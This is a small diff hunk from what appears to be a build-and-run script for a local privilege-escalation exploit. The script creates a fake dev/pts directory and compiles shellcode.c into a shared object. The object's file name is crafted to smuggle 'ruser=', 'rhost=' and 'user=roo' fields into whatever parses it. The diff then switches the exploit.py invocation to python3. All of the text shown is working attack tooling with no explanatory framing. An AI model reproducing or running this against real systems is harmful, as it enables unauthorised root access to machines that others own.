@@ -19,4 +19,4 @@ mkdir "$folder_name/dev/pts"
 
 /tmp/x86_64-linux-musl-cross/bin/x86_64-linux-musl-gcc -w -O3 -shared -nostdlib -o "$folder_name/dev/pts/$tty_number ruser=$user rhost=  user=roo.so.2"  shellcode.c
 
-python exploit.py
+python3 exploit.py
